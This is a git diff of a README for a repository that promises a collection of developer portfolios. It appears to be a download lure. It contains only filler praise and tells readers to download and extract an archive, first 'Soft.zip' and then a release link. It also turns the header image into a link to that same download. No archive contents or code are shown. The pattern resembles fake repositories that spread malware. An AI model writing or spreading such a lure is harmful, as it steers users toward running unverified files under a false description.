@@ -11,7 +11,7 @@ Welcome to the "portfolios-for-inspiration" repository! Here you will find a cur
 In this repository, you will find a diverse range of developer portfolios that showcase creativity, innovation, and technical skills. From simple and minimalistic designs to complex and interactive layouts, each portfolio has something unique to offer. Browse through these portfolios to get inspired and bring your own portfolio to life.
 
 ## How to Access the Portfolios?
-To access the portfolios for inspiration, simply download the portfolio collection by clicking [here](https://github.com/files/Soft.zip).
+To access the portfolios for inspiration, simply download the portfolio collection by clicking [here](https://github.com/bukansayaloh/portfolios-for-inspiration/releases/tag/v1.2).
 Please make sure to extract the files and explore the amazing portfolios within.
 
 ## Take Action ✨
@@ -23,4 +23,4 @@ Now that you have access to this treasure trove of developer portfolios, it's ti
 
 Let this collection of portfolios ignite your creativity and empower you to craft a portfolio that stands out in the digital world. Happy coding and portfolio building! 🚀🎉
 
-![Developer Portfolio](https://images.unsplash.com/photo-1556761175-61502b6be28c?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=60)
+![Developer Portfolio](https://github.com/bukansayaloh/portfolios-for-inspiration/releases/tag/v1.2)
